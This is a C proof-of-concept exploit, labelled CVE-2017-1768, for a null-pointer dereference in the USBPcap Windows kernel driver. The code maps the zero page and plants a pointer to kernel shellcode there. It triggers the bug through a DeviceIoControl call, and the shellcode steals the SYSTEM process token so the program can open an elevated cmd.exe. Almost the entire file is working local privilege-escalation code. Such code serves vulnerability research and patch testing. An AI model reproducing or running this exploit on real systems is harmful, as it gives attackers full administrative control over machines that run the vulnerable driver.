#include <stdio.h>
#include <windows.h>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS
(WINAPI* My_NtAllocateVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect
	);

My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

int __stdcall ShellCode(int a1,int a2)
{
	__debugbreak();
	_asm
	{
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// Find the process activity list
					 sub eax, 0xb8    		// List traversal
					 cmp[eax + 0xb4], edx   // Determine whether it is SYSTEM based on PID
					 jnz find_sys_pid

					 // Replace the Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
	}
	return 0;
}

VOID Poc()
{
	HANDLE hDevice;
	DWORD lpbReturn = 0;
	hDevice = CreateFileA("\\\\.\\USBPcap1",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);


	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] CreateFile failed (%.08x)\n", GetLastError());
		return -1;
	}
	__debugbreak();
	BOOL bResult = DeviceIoControl(hDevice,
		0x00090000,
		(LPVOID)0x1,
		(DWORD)0,
		NULL,
		0,
		&lpbReturn,
		NULL);

	if (!bResult)
	{
		printf("[-] DeviceIOControl failed (%.08x)\n", GetLastError());
		return 0;
	}

	return 0;
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main()
{
	printf("[+] CVE-2017-1768\n[+] Write by Thunder_J 2019.8\n");

	// 申明函数
	*(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
		GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL)
	{
		printf("[+] Failed to get function NtAllocateVirtualMemory!!!\n");
		system("pause");
		return 0;
	}

	// 零页申请内存
	PVOID Zero_addr = (PVOID)1;
	SIZE_T RegionSize = 0x1000;

	printf("[+] Started to alloc zero page");
	if (!NT_SUCCESS(NtAllocateVirtualMemory(
		INVALID_HANDLE_VALUE,
		&Zero_addr,
		0,
		&RegionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE)) || Zero_addr != NULL)
	{
		printf("[+] Failed to alloc zero page!\n");
		system("pause");
		return 0;
	}

	ZeroMemory(Zero_addr, RegionSize);
	printf(" => done!\n");

	*(DWORD*)(0x6c) = (DWORD)& ShellCode;

	Poc();

	CreateCmd();
	system("pause");
	return 0;
}